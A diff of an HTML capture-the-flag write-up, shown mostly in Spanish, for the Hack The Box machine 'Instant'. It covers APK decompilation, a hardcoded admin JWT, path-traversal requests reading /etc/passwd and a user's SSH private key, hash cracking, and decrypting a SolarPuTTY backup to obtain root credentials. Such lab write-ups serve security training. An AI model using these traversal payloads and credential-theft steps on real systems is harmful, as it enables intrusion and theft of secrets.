+        <pre><code class="language-bash">su root
+# Enter password: 12**24nzC!r0c%q12</code></pre>
+
+        <p>Alternatively, I can use SSH directly with these credentials:</p>
+
+        <pre><code class="language-bash">ssh root@instant.htb
+# Enter password: 12**24nzC!r0c%q12</code></pre>
+
+        <p>I successfully gain root access and can retrieve the root flag, completing the machine.</p>
+      </div>
+
+      <div id="content-es" class="lang-content" style="display:none;">
+        <div class="machine-summary">
+          <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+          <p><strong>Resumen del proceso:</strong> La máquina objetivo alojaba una aplicación de monedero móvil
+            disponible como descarga APK. Tras decompilar el APK con <code>apktool</code>, descubrí dos subdominios
+            ocultos en la configuración de seguridad de red: uno alojando una API (<code>mywalletv1.instant.htb</code>)
+            y otro alojando su documentación Swagger (<code>swagger-ui.instant.htb</code>). Un análisis más profundo del
+            APK decomilado reveló un token JWT de administrador hardcodeado en la clase <code>AdminActivities</code>,
+            que otorgaba privilegios elevados para interactuar con la API.</p>
+          <p>Usando este token de admin, exploté una vulnerabilidad de Local File Inclusion (LFI) en el endpoint
+            <code>/api/v1/admin/read/log</code> para leer archivos arbitrarios del sistema de archivos. A través de esta
+            vulnerabilidad, extraje la clave privada SSH del usuario <code>shirohige</code> desde
+            <code>/home/shirohige/.ssh/id_rsa</code>, obteniendo acceso inicial de usuario.</p>
+          <p>Para la escalada de privilegios, descubrí un archivo de backup de sesión SolarPuTTY encriptado en
+            <code>/opt/backups/Solar-PuTTY/sessions-backup.dat</code>. Usando un script Python para realizar fuerza
+            bruta sobre la contraseña de encriptación con <code>rockyou.txt</code>, descifré el archivo y obtuve
+            credenciales de root almacenadas dentro de los datos de sesión, consiguiendo acceso completo al sistema.</p>
+          <p><strong>Tecnologías/Exploits:</strong> Ingeniería inversa de APK con apktool, bypass de autenticación JWT
+            mediante credenciales hardcodeadas, Local File Inclusion (LFI) en API, descifrado de archivos de sesión
+            SolarPuTTY, extracción de credenciales desde backups encriptados.</p>
+        </div>
+        <hr class="summary-divider">
+
+        <h2>Reconocimiento Inicial</h2>
+        <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+        <p><img src="./media/image1.png"
+            alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" />
+        </p>
+
+        <p>El escaneo revela dos servicios principales: SSH en el puerto 22 y HTTP en el puerto 80. Añado
+          <code>instant.htb</code> a mi archivo <code>/etc/hosts</code> y procedo a explorar el servicio web.</p>
+
+        <h2>Enumeración Web</h2>
+        <p>La aplicación web parece ser un servicio de monedero móvil que permite transferencias de dinero instantáneas.
+          El sitio web promociona una aplicación Android y proporciona un enlace de descarga para el archivo APK en
+          <code>http://instant.htb/downloads/instant.apk</code>.</p>
+
+        <p>Ejecuto enumeración de directorios y vhosts con <code>gobuster</code>, pero inicialmente no encuentro ningún
+          endpoint adicional interesante o hosts virtuales. Como la aplicación web en sí no revela mucha información
+          útil y gobuster no devuelve resultados interesantes, decido analizar la aplicación móvil directamente.</p>
+
+        <h2>Análisis del APK - Ingeniería Inversa</h2>
+        <p>Descargo el archivo APK y lo descompilo usando <code>apktool</code>, una herramienta para ingeniería inversa
+          de aplicaciones Android (<a
+            href="https://www.kali.org/tools/apktool/">https://www.kali.org/tools/apktool/</a>).</p>
+
+        <pre><code class="language-bash">apktool d instant.apk</code></pre>
+
+        <p>Tras descompilar, exploro la estructura de la aplicación buscando archivos de configuración, credenciales
+          hardcodeadas o cualquier información sensible. A primera vista, no hay ninguna configuración obvia o
+          credenciales visibles en los archivos principales.</p>
+
+        <h3>Descubriendo Subdominios Ocultos</h3>
+        <p>Abro el código decomilado en Visual Studio Code para un análisis más exhaustivo. Aunque no encuentro ninguna
+          credencial hardcodeada inicialmente, descubro algo interesante en el archivo
+          <code>/res/xml/network_security_config.xml</code>:</p>
+
+        <pre><code class="language-xml">&lt;domain-config cleartextTrafficPermitted="true"&gt;
     &lt;domain includeSubdomains="true"&gt;mywalletv1.instant.htb&lt;/domain&gt;
     &lt;domain includeSubdomains="true"&gt;swagger-ui.instant.htb&lt;/domain&gt;
 &lt;/domain-config&gt;</code></pre>
-                
-                <p>Esta configuración revela dos subdominios que no fueron descubiertos durante mi enumeración inicial. Añado ambos dominios a mi archivo <code>/etc/hosts</code>:</p>
-                
-                <pre><code class="language-bash">echo "10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts</code></pre>
-                
-                <h2>Exploración de la API - Documentación Swagger</h2>
-                <p>Navegando a <code>swagger-ui.instant.htb</code>, encuentro documentación completa de la API:</p>
-                
-                <p><img src="./media/image2.png" alt="Interfaz de Swagger UI mostrando la documentación completa de la API con los endpoints disponibles" /></p>
-                
-                <p>La interfaz Swagger revela la estructura completa de la API con todos los endpoints disponibles, formatos de petición y respuestas esperadas. La API parece manejar registro de usuarios, autenticación, operaciones de monedero y funciones administrativas. Un subdominio (<code>mywalletv1.instant.htb</code>) aloja la API real, mientras que el otro proporciona su documentación Swagger para una navegación sencilla.</p>
-                
-                <h2>Interacción con la API - Registro y Autenticación de Usuario</h2>
-                <p>Basándome en la documentación Swagger, procedo a registrar una cuenta de usuario de prueba:</p>
-                
-                <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/register' \
+
+        <p>Esta configuración revela dos subdominios que no fueron descubiertos durante mi enumeración inicial. Añado
+          ambos dominios a mi archivo <code>/etc/hosts</code>:</p>
+
+        <pre><code class="language-bash">echo "10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts</code></pre>
+
+        <h2>Exploración de la API - Documentación Swagger</h2>
+        <p>Navegando a <code>swagger-ui.instant.htb</code>, encuentro documentación completa de la API:</p>
+
+        <p><img src="./media/image2.png"
+            alt="Interfaz de Swagger UI mostrando la documentación completa de la API con los endpoints disponibles" />
+        </p>
+
+        <p>La interfaz Swagger revela la estructura completa de la API con todos los endpoints disponibles, formatos de
+          petición y respuestas esperadas. La API parece manejar registro de usuarios, autenticación, operaciones de
+          monedero y funciones administrativas. Un subdominio (<code>mywalletv1.instant.htb</code>) aloja la API real,
+          mientras que el otro proporciona su documentación Swagger para una navegación sencilla.</p>
+
+        <h2>Interacción con la API - Registro y Autenticación de Usuario</h2>
+        <p>Basándome en la documentación Swagger, procedo a registrar una cuenta de usuario de prueba:</p>
+
+        <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/register' \
   -d '{"email":"asd@asd.com", "password":"xd", "pin":"12345", "username":"asd"}' \
   -H "Content-Type: application/json"</code></pre>
-                
-                <p>Tras el registro exitoso, me autentico para obtener un token de acceso:</p>
-                
-                <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/login' \
+
+        <p>Tras el registro exitoso, me autentico para obtener un token de acceso:</p>
+
+        <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/login' \
   -d '{"password":"xd", "username":"asd"}' \
   -H "Content-Type: application/json"</code></pre>
-                
-                <p>La API responde con un token JWT:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>La API responde con un token JWT:</p>
+
+        <pre><code class="language-json">{
   "Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mywicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6Ijg0MDBiOGFkLTU2OTgtNDA2MC1iNmI1LTBmMDE0M2U5MGQ4NyIsImV4cCI6MTc1OTY5MDc2MX0.sLX6MkZpwf4TbxITnRU_E2vpPG7RiIgYRjKi1_S8B30",
   "Status": 201
 }</code></pre>
-                
-                <p>Decodificando el payload del JWT revela:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>Decodificando el payload del JWT revela:</p>
+
+        <pre><code class="language-json">{
   "id": 3,
   "role": "instantian",
   "walId": "8400b8ad-5698-4060-b6b5-0f0143e90d87"
 }</code></pre>
-                
-                <p>Mi usuario tiene el rol <code>instantian</code>, que parece ser un rol de usuario regular. Intento usar este token con el formato de cabecera estándar <code>Authorization: Bearer {token}</code>, pero no funciona como se esperaba.</p>
-                
-                <h2>Escalada de Privilegios - Encontrando el Token de Admin</h2>
-                <p>Mientras busco a través del APK decomilado información sobre cómo usar correctamente la cabecera de Authorization, hago un descubrimiento crítico en la clase <code>AdminActivities</code>. La aplicación contiene un token JWT de administrador hardcodeado:</p>
-                
-                <pre><code class="language-plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA</code></pre>
-                
-                <p>Decodificar este token revela privilegios elevados:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>Mi usuario tiene el rol <code>instantian</code>, que parece ser un rol de usuario regular. Intento usar este
+          token con el formato de cabecera estándar <code>Authorization: Bearer {token}</code>, pero no funciona como se
+          esperaba.</p>
+
+        <h2>Escalada de Privilegios - Encontrando el Token de Admin</h2>
+        <p>Mientras busco a través del APK decomilado información sobre cómo usar correctamente la cabecera de
+          Authorization, hago un descubrimiento crítico en la clase <code>AdminActivities</code>. La aplicación contiene
+          un token JWT de administrador hardcodeado:</p>
+
+        <pre><code class="language-plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA</code></pre>
+
+        <p>Decodificar este token revela privilegios elevados:</p>
+
+        <pre><code class="language-json">{
   "id": 1,
   "role": "Admin",
   "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
 }</code></pre>
-                
-                <p>Este token tiene el rol <code>Admin</code> y una fecha de expiración extremadamente distante. También descubro que el formato correcto de la cabecera es simplemente <code>Authorization: {token}</code> sin el prefijo "Bearer".</p>
-                
-                <h3>Accediendo a Funcionalidad de Admin</h3>
-                <p>Usando el token de admin con el formato correcto de cabecera, ahora puedo acceder a endpoints privilegiados de la API:</p>
-                
-                <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/view/profile' \
+
+        <p>Este token tiene el rol <code>Admin</code> y una fecha de expiración extremadamente distante. También
+          descubro que el formato correcto de la cabecera es simplemente <code>Authorization: {token}</code> sin el
+          prefijo "Bearer".</p>
+
+        <h3>Accediendo a Funcionalidad de Admin</h3>
+        <p>Usando el token de admin con el formato correcto de cabecera, ahora puedo acceder a endpoints privilegiados
+          de la API:</p>
+
+        <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/view/profile' \
   -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</code></pre>
-                
-                <p>Esto devuelve el perfil de administrador:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>Esto devuelve el perfil de administrador:</p>
+
+        <pre><code class="language-json">{
   "Profile": {
     "account_status": "active",
     "email": "admin@instant.htb",
@@ -411,10 +507,10 @@ shirohige:pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2
   },
   "Status": 200
 }</code></pre>
-                
-                <p>También puedo enumerar todos los usuarios del sistema:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>También puedo enumerar todos los usuarios del sistema:</p>
+
+        <pre><code class="language-json">{
   "Status": 200,
   "Users": [
     {
@@ -443,20 +539,22 @@ shirohige:pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2
     }
   ]
 }</code></pre>
-                
-                <p>Esto revela otro usuario interesante: <code>shirohige</code>, que podría tener acceso al sistema.</p>
-                
-                <h2>Local File Inclusion - Leyendo Archivos Arbitrarios</h2>
-                <p>Explorando más los endpoints de admin, pruebo la funcionalidad de lectura de logs en <code>/api/v1/admin/read/log</code>. Este endpoint acepta un parámetro <code>log_file_name</code>, lo cual inmediatamente sugiere una potencial vulnerabilidad de Local File Inclusion.</p>
-                
-                <p>Pruebo el LFI intentando leer <code>/etc/passwd</code>:</p>
-                
-                <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../etc/passwd' \
+
+        <p>Esto revela otro usuario interesante: <code>shirohige</code>, que podría tener acceso al sistema.</p>
+
+        <h2>Local File Inclusion - Leyendo Archivos Arbitrarios</h2>
+        <p>Explorando más los endpoints de admin, pruebo la funcionalidad de lectura de logs en
+          <code>/api/v1/admin/read/log</code>. Este endpoint acepta un parámetro <code>log_file_name</code>, lo cual
+          inmediatamente sugiere una potencial vulnerabilidad de Local File Inclusion.</p>
+
+        <p>Pruebo el LFI intentando leer <code>/etc/passwd</code>:</p>
+
+        <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../etc/passwd' \
   -H "Authorization: {admin_token}"</code></pre>
-                
-                <p>¡Éxito! La API devuelve el contenido de <code>/etc/passwd</code>:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>¡Éxito! La API devuelve el contenido de <code>/etc/passwd</code>:</p>
+
+        <pre><code class="language-json">{
   "/home/shirohige/logs/../../../../../../../etc/passwd": [
     "root:x:0:0:root:/root:/bin/bash",
     "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
@@ -464,103 +562,130 @@ shirohige:pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2
     "shirohige:x:1000:1000:shirohige:/home/shirohige:/bin/bash"
   ]
 }</code></pre>
-                
-                <p>La vulnerabilidad confirma que el usuario <code>shirohige</code> existe en el sistema y tiene acceso a shell bash. Antes de intentar identificar la tecnología subyacente, decido comprobar si puedo acceder directamente a claves SSH.</p>
-                
-                <h3>Extrayendo la Clave Privada SSH</h3>
-                <p>Intento leer la clave privada SSH del usuario <code>shirohige</code>:</p>
-                
-                <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../home/shirohige/.ssh/id_rsa' \
+
+        <p>La vulnerabilidad confirma que el usuario <code>shirohige</code> existe en el sistema y tiene acceso a shell
+          bash. Antes de intentar identificar la tecnología subyacente, decido comprobar si puedo acceder directamente a
+          claves SSH.</p>
+
+        <h3>Extrayendo la Clave Privada SSH</h3>
+        <p>Intento leer la clave privada SSH del usuario <code>shirohige</code>:</p>
+
+        <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../home/shirohige/.ssh/id_rsa' \
   -H "Authorization: {admin_token}"</code></pre>
-                
-                <p>¡La vulnerabilidad LFI recupera exitosamente la clave privada SSH! Guardo esta clave en un archivo, establezco los permisos apropiados y la uso para obtener acceso SSH:</p>
-                
-                <pre><code class="language-bash">chmod 600 id_rsa
+
+        <p>¡La vulnerabilidad LFI recupera exitosamente la clave privada SSH! Guardo esta clave en un archivo,
+          establezco los permisos apropiados y la uso para obtener acceso SSH:</p>
+
+        <pre><code class="language-bash">chmod 600 id_rsa
 ssh -i id_rsa shirohige@instant.htb</code></pre>
-                
-                <p>Me conecto exitosamente como <code>shirohige</code> y puedo recuperar la flag de usuario.</p>
-                
-                <h2>Enumeración Post-Explotación</h2>
-                <p>Tras obtener acceso de usuario, realizo enumeración adicional para identificar vectores de escalada de privilegios.</p>
-                
-                <h3>Servicios Internos</h3>
-                <p>Usando <code>ss -tuln</code>, descubro dos puertos vinculados localmente: 8888 y 8808. Tras investigar, resulta que son los servicios de API y Swagger que están siendo reverse-proxeados a los dominios expuestos a internet.</p>
-                
-                <h3>Análisis del Código Fuente de la API</h3>
-                <p>Localizo el directorio del proyecto de la API y examino el código fuente. Encuentro una clave secreta hardcodeada:</p>
-                
-                <pre><code class="language-plaintext">VeryStrongS3cretKeyY0uC4NTGET</code></pre>
-                
-                <p>Aunque esto podría ser interesante, no proporciona inmediatamente un camino hacia la escalada de privilegios.</p>
-                
-                <h3>Análisis de Base de Datos</h3>
-                <p>Dentro del proyecto de la API, descubro una base de datos SQLite3. Como <code>sqlite3</code> no está instalado en la máquina objetivo, transfiero la base de datos a mi máquina local usando un servidor HTTP de Python:</p>
-                
-                <pre><code class="language-bash"># En el objetivo
+
+        <p>Me conecto exitosamente como <code>shirohige</code> y puedo recuperar la flag de usuario.</p>
+
+        <h2>Enumeración Post-Explotación</h2>
+        <p>Tras obtener acceso de usuario, realizo enumeración adicional para identificar vectores de escalada de
+          privilegios.</p>
+
+        <h3>Servicios Internos</h3>
+        <p>Usando <code>ss -tuln</code>, descubro dos puertos vinculados localmente: 8888 y 8808. Tras investigar,
+          resulta que son los servicios de API y Swagger que están siendo reverse-proxeados a los dominios expuestos a
+          internet.</p>
+
+        <h3>Análisis del Código Fuente de la API</h3>
+        <p>Localizo el directorio del proyecto de la API y examino el código fuente. Encuentro una clave secreta
+          hardcodeada:</p>
+
+        <pre><code class="language-plaintext">VeryStrongS3cretKeyY0uC4NTGET</code></pre>
+
+        <p>Aunque esto podría ser interesante, no proporciona inmediatamente un camino hacia la escalada de privilegios.
+        </p>
+
+        <h3>Análisis de Base de Datos</h3>
+        <p>Dentro del proyecto de la API, descubro una base de datos SQLite3. Como <code>sqlite3</code> no está
+          instalado en la máquina objetivo, transfiero la base de datos a mi máquina local usando un servidor HTTP de
+          Python:</p>
+
+        <pre><code class="language-bash"># En el objetivo
 python3 -m http.server 9000
 
 # En la máquina atacante
 wget http://instant.htb:9000/database.db</code></pre>
-                
-                <p>Examinando la base de datos localmente, encuentro una tabla de usuarios conteniendo contraseñas hasheadas:</p>
-                
-                <pre><code class="language-plaintext">admin:pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
+
+        <p>Examinando la base de datos localmente, encuentro una tabla de usuarios conteniendo contraseñas hasheadas:
+        </p>
+
+        <pre><code class="language-plaintext">admin:pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
 shirohige:pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed</code></pre>
-                
-                <p>Estos parecen ser hashes PBKDF2-SHA256 comúnmente usados por aplicaciones Django y Flask. Para crackearlos con hashcat, necesito formatearlos correctamente. Hashcat espera el formato:</p>
-                
-                <pre><code class="language-plaintext">pbkdf2_sha256$iterations$salt$hash_in_base64</code></pre>
-                
-                <p>Convierto el formato reemplazando los dos puntos por guiones bajos y signos de dólar, y asegurándome de que el digest del hash esté codificado en base64 (la salt ya está en formato base64):</p>
-                
-                <pre><code class="language-bash">hashcat -m 10000 hashes.txt rockyou.txt</code></pre>
-                
-                <p>Desafortunadamente, tras ejecutar hashcat durante un tiempo considerable, no consigo crackear ninguna contraseña. Esto sugiere que necesito encontrar otro camino de escalada de privilegios.</p>
-                
-                <h2>Escalada de Privilegios - Descifrado de Sesión SolarPuTTY</h2>
-                <p>Continuando mi enumeración, exploro el directorio <code>/opt</code> y descubro algo inusual en <code>/opt/backups/Solar-PuTTY</code> - un archivo llamado <code>sessions-backup.dat</code>.</p>
-                
-                <p>SolarPuTTY es una alternativa a PuTTY que almacena configuraciones de sesiones SSH, incluyendo credenciales. Estos archivos de sesión están encriptados, pero potencialmente pueden descifrarse si podemos hacer fuerza bruta u obtener la contraseña.</p>
-                
-                <h3>Encontrando una Herramienta de Descifrado</h3>
-                <p>Busco herramientas para descifrar archivos de sesión de SolarPuTTY y primero encuentro este repositorio: <a href="https://github.com/VoidSec/SolarPuttyDecrypt">https://github.com/VoidSec/SolarPuttyDecrypt</a></p>
-                
-                <p>Sin embargo, esta herramienta está algo desactualizada y el script de Ruby no funciona correctamente con el formato actual del archivo de sesión. Continuando mi investigación, descubro un script Python en un gist de GitHub que está más actualizado:</p>
-                
-                <p><a href="https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5">https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5</a></p>
-                
-                <p>Este script Python puede hacer fuerza bruta sobre la contraseña de encriptación para archivos de backup de sesión de SolarPuTTY.</p>
-                
-                <h3>Crackeando el Archivo de Sesión</h3>
-                <p>Transfiero el archivo <code>sessions-backup.dat</code> a mi máquina local y ejecuto el script de descifrado con el diccionario <code>rockyou.txt</code>:</p>
-                
-                <pre><code class="language-bash">python3 solarputty_decrypt.py sessions-backup.dat rockyou.txt</code></pre>
-                
-                <p>Tras algún tiempo de procesamiento, el script crackea exitosamente la contraseña de encriptación: <code>estrella</code></p>
-                
-                <p>Usando esta contraseña, el script descifra los datos de sesión y revela credenciales almacenadas, incluyendo:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>Estos parecen ser hashes PBKDF2-SHA256 comúnmente usados por aplicaciones Django y Flask. Para crackearlos
+          con hashcat, necesito formatearlos correctamente. Hashcat espera el formato:</p>
+
+        <pre><code class="language-plaintext">pbkdf2_sha256$iterations$salt$hash_in_base64</code></pre>
+
+        <p>Convierto el formato reemplazando los dos puntos por guiones bajos y signos de dólar, y asegurándome de que
+          el digest del hash esté codificado en base64 (la salt ya está en formato base64):</p>
+
+        <pre><code class="language-bash">hashcat -m 10000 hashes.txt rockyou.txt</code></pre>
+
+        <p>Desafortunadamente, tras ejecutar hashcat durante un tiempo considerable, no consigo crackear ninguna
+          contraseña. Esto sugiere que necesito encontrar otro camino de escalada de privilegios.</p>
+
+        <h2>Escalada de Privilegios - Descifrado de Sesión SolarPuTTY</h2>
+        <p>Continuando mi enumeración, exploro el directorio <code>/opt</code> y descubro algo inusual en
+          <code>/opt/backups/Solar-PuTTY</code> - un archivo llamado <code>sessions-backup.dat</code>.</p>
+
+        <p>SolarPuTTY es una alternativa a PuTTY que almacena configuraciones de sesiones SSH, incluyendo credenciales.
+          Estos archivos de sesión están encriptados, pero potencialmente pueden descifrarse si podemos hacer fuerza
+          bruta u obtener la contraseña.</p>
+
+        <h3>Encontrando una Herramienta de Descifrado</h3>
+        <p>Busco herramientas para descifrar archivos de sesión de SolarPuTTY y primero encuentro este repositorio: <a
+            href="https://github.com/VoidSec/SolarPuttyDecrypt">https://github.com/VoidSec/SolarPuttyDecrypt</a></p>
+
+        <p>Sin embargo, esta herramienta está algo desactualizada y el script de Ruby no funciona correctamente con el
+          formato actual del archivo de sesión. Continuando mi investigación, descubro un script Python en un gist de
+          GitHub que está más actualizado:</p>
+
+        <p><a
+            href="https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5">https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5</a>
+        </p>
+
+        <p>Este script Python puede hacer fuerza bruta sobre la contraseña de encriptación para archivos de backup de
+          sesión de SolarPuTTY.</p>
+
+        <h3>Crackeando el Archivo de Sesión</h3>
+        <p>Transfiero el archivo <code>sessions-backup.dat</code> a mi máquina local y ejecuto el script de descifrado
+          con el diccionario <code>rockyou.txt</code>:</p>
+
+        <pre><code class="language-bash">python3 solarputty_decrypt.py sessions-backup.dat rockyou.txt</code></pre>
+
+        <p>Tras algún tiempo de procesamiento, el script crackea exitosamente la contraseña de encriptación:
+          <code>estrella</code></p>
+
+        <p>Usando esta contraseña, el script descifra los datos de sesión y revela credenciales almacenadas, incluyendo:
+        </p>
+
+        <pre><code class="language-json">{
   "Username": "root",
   "Password": "12**24nzC!r0c%q12"
 }</code></pre>
-                
-                <h3>Acceso Root</h3>
-                <p>Con las credenciales de root extraídas del backup de sesión de SolarPuTTY, ahora puedo escalar privilegios:</p>
-                
-                <pre><code class="language-bash">su root
+
+        <h3>Acceso Root</h3>
+        <p>Con las credenciales de root extraídas del backup de sesión de SolarPuTTY, ahora puedo escalar privilegios:
+        </p>
+
+        <pre><code class="language-bash">su root
 # Introducir contraseña: 12**24nzC!r0c%q12</code></pre>
-                
-                <p>Alternativamente, puedo usar SSH directamente con estas credenciales:</p>
-                
-                <pre><code class="language-bash">ssh root@instant.htb
+
+        <p>Alternativamente, puedo usar SSH directamente con estas credenciales:</p>
+
+        <pre><code class="language-bash">ssh root@instant.htb
 # Introducir contraseña: 12**24nzC!r0c%q12</code></pre>
-                
-                <p>Obtengo exitosamente acceso root y puedo recuperar la flag de root, completando la máquina.</p>
-            </div>
-        </article>
-    </main>
-    <script src="../../index.js"></script>
+
+        <p>Obtengo exitosamente acceso root y puedo recuperar la flag de root, completando la máquina.</p>
+      </div>
+    </article>
+  </main>
+  <script src="../../index.js"></script>
 </body>
 
 </html>
